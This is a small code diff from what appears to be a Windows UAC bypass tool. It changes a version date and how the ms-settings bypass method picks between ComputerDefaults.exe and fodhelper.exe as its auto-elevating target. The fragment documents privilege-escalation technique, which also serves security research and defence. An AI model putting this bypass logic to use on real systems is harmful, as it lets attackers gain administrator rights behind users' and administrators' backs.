@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.26
 *
-*  DATE:        23 May 2020
+*  DATE:        24 May 2020
 *
 *  UAC bypass dispatch.
 *
@@ -926,7 +926,7 @@ UCM_API(MethodMsSettings)
     else
         lpszPayload = g_ctx->szOptionalParameter;
 
-    if (g_ctx->dwBuildNumber >= 17134)
+    if (Parameter->Method == UacMethodMsSettings2)
         lpszTargetApp = COMPUTERDEFAULTS_EXE;
     else
         lpszTargetApp = FODHELPER_EXE;
